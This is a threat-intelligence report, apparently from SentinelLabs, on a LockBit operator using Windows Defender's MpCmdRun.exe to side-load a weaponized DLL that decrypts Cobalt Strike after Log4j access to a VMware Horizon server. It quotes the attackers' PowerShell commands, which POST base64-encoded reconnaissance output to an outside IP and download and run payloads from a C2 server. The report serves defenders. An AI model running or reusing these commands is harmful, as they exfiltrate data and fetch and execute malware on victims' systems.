Sideloads Cobalt Strike Through Microsoft Security Tool

LockBit has been receiving a fair share of attention recently. Last week, SentinelLabs
reported on LockBit 3.0 (aka LockBit Black), describing how the latest iteration of this
increasingly prevalent RaaS implemented a series of anti-analysis and anti-debugging
routines. Our research was quickly followed up by others reporting similar findings.
Meanwhile, back in April, SentinelLabs reported on how a LockBit affiliate was leveraging the
legitimate VMware command line utility, VMwareXferlogs.exe , in a live engagement to
side load Cobalt Strike.
In this post, we follow up on that incident by describing the use of another legitimate tool
used to similar effect by a LockBit operator or affiliate, only this time the tool in question turns
out to belong to a security tool: Windows Defender. During a recent investigation, we found
that threat actors were abusing the Windows Defender command line tool MpCmdRun.exe
to decrypt and load Cobalt Strike payloads.

Overview
The initial target compromise happened via the Log4j vulnerability against an unpatched
VMWare Horizon Server. The attackers modified the Blast Secure Gateway component of
the application installing a web shell using PowerShell code found documented here.
Once initial access had been achieved, the threat actors performed a series of enumeration
commands and attempted to run multiple post-exploitation tools, including Meterpreter,
PowerShell Empire and a new way to side-load Cobalt Strike.
In particular, when attempting to execute Cobalt Strike we observed a new legitimate tool
used for side-loading a malicious DLL, that decrypts the payload.
Previously observed techniques to evade defenses by removing EDR/EPP’s userland hooks,
Event Tracing for Windows and Antimalware Scan Interface were also observed.

Attack Chain

2/6

Once the attackers gained initial access via the Log4j vulnerability, reconnaissance began
using PowerShell to execute commands and exfiltrate the command output via a POST
base64 encoded request to an IP. Examples of the reconnaissance activity can be seen
below:
powershell -c curl -uri http://139.180.184[.]147:80 -met POST -Body
([System.Convert]::ToBase64String(([System.Text.Encoding]::ASCII.GetBytes((whoami)))))
-c curl -uri http://139.180.184[.]147:80 -met POST -Body
([System.Convert]::ToBase64String(([System.Text.Encoding]::ASCII.GetBytes((nltest
/domain_trusts)))))

Once the threat actor acquired sufficient privileges, they attempted to download and execute
multiple post-exploitation payloads.
The threat actor downloads a malicious DLL, the encrypted payload and the legitimate tool
from their controlled C2:

powershell -c Invoke-WebRequest -uri http://45.32.108[.]54:443/mpclient.dll -OutFile
c:\windows\help\windows\mpclient.dll;Invoke-WebRequest -uri
http://45.32.108[.]54:443/c0000015.log -OutFile
c:\windows\help\windows\c0000015.log;Invoke-WebRequest -uri
http://45.32.108[.]54:443/MpCmdRun.exe -OutFile
c:\windows\help\windows\MpCmdRun.exe;c:\windows\help\windows\MpCmdRun.exe

Notably, the threat actor leverages the legitimate Windows Defender command line tool
MpCmdRun.exe to decrypt and load Cobalt Strike payloads.

We also note the correlation between the IP address used to download the Cobalt Strike
payload and the IP address used to perform reconnaissance: shortly after downloading
Cobalt Strike the threat actor tried to execute and send the output to the IP starting with 139,
as can be seen in both snippets below.
powershell -c Invoke-WebRequest -uri http://45.32.108[.]54:443/glib-2.0.dll -OutFile
c:\users\public\glib-2.0.dll;Invoke-WebRequest -uri
http://45.32.108[.]54:443/c0000013.log -OutFile c:\users\public\c0000013.log;InvokeWebRequest -uri http://45.32.108[.]54:443/VMwareXferlogs.exe -OutFile
c:\users\public\VMwareXferlogs.exe;c:\users\public\VMwareXferlogs.exe

powershell -c curl -uri http://139.180.184[.]147:80 -met POST -Body
([System.Convert]::ToBase64String(([System.Text.Encoding]::ASCII.GetBytes((c:\users\pu

Following the same flow as the sideloading of the VMwareXferlogs.exe utility reported on
previously, MpCmd.exe is abused to side-load a weaponized mpclient.dll , which loads
and decrypts Cobalt Strike Beacon from the c0000015.log file.
As such, the components used in the attack specifically related to the use of the Windows
Defender command line tool are:
Filename

mpclient.dll

Weaponized DLL loaded by MpCmdRun.exe

MpCmdRun.exe

Legitimate/signed Microsoft Defender utility

C0000015.log

Encrypted Cobalt Strike payload

Conclusion
Defenders need to be alert to the fact that LockBit ransomware operators and affiliates are
exploring and exploiting novel “living off the land” tools to aid them in loading Cobalt Strike
beacons and evading some common EDR and traditional AV detection tools.
Importantly, tools that should receive careful scrutiny are any that either the organization or
the organization’s security software have made exceptions for. Products like VMware and
Windows Defender have a high prevalence in the enterprise and a high utility to threat actors
if they are allowed to operate outside of the installed security controls.
